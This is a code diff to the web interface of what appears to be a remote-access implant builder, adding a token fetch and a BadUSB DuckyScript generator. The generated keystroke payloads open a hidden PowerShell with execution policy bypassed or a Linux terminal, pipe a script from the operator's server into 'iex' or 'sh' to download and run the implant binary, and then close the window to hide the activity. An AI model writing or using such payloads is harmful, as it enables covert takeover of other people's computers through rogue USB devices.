@@ -48,6 +48,7 @@ const app = state({
   paletteQuery: "",
   paletteIndex: 0, // selected row in the palette
   modal: null, // "build" | "badusb" | null — which modal is open
+  buildToken: "", // BUILD_TOKEN fetched from /api/build/token for the BadUSB /s URL
   badUsbOs: "linux",
   badUsbArch: "amd64",
   badUsbTags: "",
@@ -335,6 +336,11 @@ async function loadBuildTargets() {
         app.buildTarget = app.buildTargets[0] || "";
       }
     }
+    const tok = await fetch("/api/build/token");
+    if (tok.ok) {
+      const t = await tok.json();
+      app.buildToken = t.token || "";
+    }
   } catch {
     /* ignore */
   }
@@ -394,22 +400,34 @@ function badUsbDownloadUrl() {
   return `${proto}${host}/dl?${new URLSearchParams(q)}`;
 }
 
+// Short bootstrap URL — the DuckyScript types `curl <this> | sh`, the
+// script fetched from here downloads + runs the full binary. Keeps the
+// typed payload minimal.
+function badUsbShortUrl() {
+  const os = app.badUsbOs || "linux";
+  const arch = app.badUsbArch || "amd64";
+  const tags = app.badUsbTags || "";
+  const proto = location.protocol === "https:" ? "https://" : "http://";
+  const host = location.host;
+  const q = { os, arch };
+  if (tags) q.tags = tags;
+  if (app.buildToken) q.token = app.buildToken;
+  return `${proto}${host}/s?${new URLSearchParams(q)}`;
+}
+
 function badUsbScript() {
-  const url = badUsbDownloadUrl();
+  const url = badUsbShortUrl();
   const os = app.badUsbOs || "linux";
   const lines = [];
   if (os === "windows" || os === "win") {
     lines.push("GUI r");
     lines.push("DELAY 500");
-    lines.push("STRING powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden");
-    lines.push("ENTER");
-    lines.push("DELAY 1000");
-    lines.push(`STRING $r=Invoke-WebRequest -Uri '${url}' -OutFile "$env:TEMP\\rsl.exe"; Start-Process "$env:TEMP\\rsl.exe"`);
+    lines.push("STRING powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -c \"iwr '" + url + "' | iex\"");
     lines.push("ENTER");
   } else {
     lines.push("CTRL ALT t");
     lines.push("DELAY 800");
-    lines.push("STRING curl -sL '" + url + "' -o /tmp/.rsl && chmod +x /tmp/.rsl && /tmp/.rsl &");
+    lines.push("STRING curl -sL '" + url + "' | sh &");
     lines.push("ENTER");
     lines.push("DELAY 200");
     lines.push("CTRL w");
